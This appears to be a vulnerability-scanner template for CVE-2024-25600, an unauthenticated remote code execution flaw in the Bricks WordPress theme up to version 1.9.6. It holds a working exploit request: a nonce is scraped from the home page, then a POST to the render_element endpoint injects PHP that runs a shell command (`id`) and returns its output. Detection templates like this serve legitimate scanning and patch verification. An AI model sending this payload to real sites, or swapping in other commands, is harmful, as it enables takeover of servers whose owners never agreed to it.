http:
- extractors:
  - group: 1
    internal: true
    name: nonce
    part: body
    regex:
    - nonce":"([0-9a-z]+)
    type: regex
  matchers:
  - condition: and
    part: body
    regex:
    - 'Exception:'
    - uid=([0-9(a-z-)]+) gid=([0-9(a-z-)]+) groups=([0-9(a-z-)]+)
    type: regex
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - "POST /wp-json/bricks/v1/render_element HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"postId\": \"1\",\n  \"nonce\": \"{{nonce}}\",\n \
    \ \"element\": {\n    \"name\": \"container\",\n    \"settings\": {\n      \"\
    hasLoop\": \"true\",\n      \"query\": {\n        \"useQueryEditor\": true,\n\
    \        \"queryEditor\": \"ob_start();echo `id`;$output=ob_get_contents();ob_end_clean();throw\
    \ new Exception($output);\",\n        \"objectType\": \"post\"\n      }\n    }\n\
    \  }\n}\n"
id: CVE-2024-25600
info:
  author: christbowel
  description: 'Bricks Builder is a popular WordPress development theme with approximately
    25,000 active installations. It provides an intuitive drag-and-drop interface
    for designing and building WordPress websites. Bricks <= 1.9.6 is vulnerable to
    unauthenticated remote code execution (RCE) which means that anybody can run arbitrary
    commands and take over the site/server. This can lead to various malicious activities

    '
  metadata:
    max-request: 2
    publicwww-query: /wp-content/themes/bricks/
    verified: true
  name: "Unauthenticated Remote Code Execution \u2013 Bricks <= 1.9.6"
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25600
  - https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd/
  - https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6
  - https://github.com/Chocapikk/CVE-2024-25600
  - https://op-c.net/blog/cve-2024-25600-wordpresss-bricks-builder-rce-flaw-under-active-exploitation
  severity: critical
  tags: cve,cve2024,wpscan,wordpress,wp-plugin,wp,bricks,rce
